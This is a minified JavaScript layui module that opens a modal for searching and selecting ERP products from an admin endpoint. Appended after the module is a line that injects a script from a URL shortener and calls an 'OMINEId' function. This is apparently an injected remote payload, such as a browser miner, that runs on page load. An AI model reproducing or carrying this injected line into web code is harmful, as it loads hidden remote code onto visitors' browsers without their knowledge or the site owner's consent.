"use strict";layui.define(["layer","table","form","laypage"],function(e){var i,n=layui.layer,t=layui.table,l=layui.form,a=layui.laypage,o="",r=function(e,t){$.get("/Admin/ErpProduct/erpProductList",e,function(e){0===(e=$.parseJSON(e)).error?(i=e.data,console.log(e.data),t(e.data)):n.tips(e.msg,".modal-search-btn")})},s=function(e){t.render({elem:".select-modal-table",data:e.list,page:!1,limit:e.pageSize,cellMinWidth:160,height:"320",cols:[[{field:"checkbox",width:50,fixed:"left",templet:'<div><input class="select-modal-checkbox" lay-filter="c_check" type="checkbox" name="" lay-skin="primary"></div>'},{field:"fitemno",title:"erp型号",width:220},{field:"fstcb",title:"标准成本",width:160},{field:"store",title:"库存",width:100},{field:"last_time",title:"更新时间",width:160},{field:"create_time",title:"创建时间",width:160}]]}),l.on("checkbox(c_check)",function(e){var t=$(".select-modal-checkbox");"edit"==o?(t.prop("checked",!1),$(e.elem).prop("checked",!0)):$(e.elem).prop("checked")?$(e.elem).prop("checked",!0):$(e.elem).prop("checked",!1),l.render("checkbox")})},d=function(l){a.render({elem:$(".layui-layer-content").find(".select-modal-page")[0],limit:l.pageSize,count:l.count,curr:l.page,layout:["prev","page","next"],jump:function(e,t){t||r({page:e.curr,pageSize:l.pageSize},function(e){s(e)})}})};e("selectErpProduct",{start:function(c){n.open({title:"选择erp商品",type:0,area:["640px","70%"],content:'<div class="select-modal-container"> <div class="select-modal-box"> <div class="select-search-container"><input class="layui-input modal-search-input" type="text" placeholder="输入ERP型号检索"><div class="layui-btn-group"> <button class="layui-btn modal-search-btn">搜索</button> <button class="layui-btn layui-btn-primary modal-clear-btn">清空</button> </div></div><table lay-filter="select-modal-table" class="select-modal-table"></table> <div class="select-modal-page"></div> </div> </div>',success:function(){$(".modal-search-btn").click(function(){var e={},t=$(".modal-search-input").val().trim();t&&(e.fitemno=t),r(e,function(e){s(e),d(e)})}),r({},function(e){s(e),d(e)})},yes:function(e,t){var l=$(".layui-layer-content .select-modal-checkbox:checked");if(l.length){var a=[];l.each(function(){var e;e=$(this).parent().parent().parent().index(),a.push(i.list[e])}),c(a),n.close(e)}else n.tips("请勾选需要操作的数据",".layui-layer-btn0")}})},initInput:function(e,t,a,l){this.addRow=a;var c=this;o=l,$(e||".jl-select-erp-product").click(function(){var l=$(this);c.start(function(e){console.log(e),$.each(e,function(e,t){a&&a(t,l,e)}),t&&t(e,l)})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');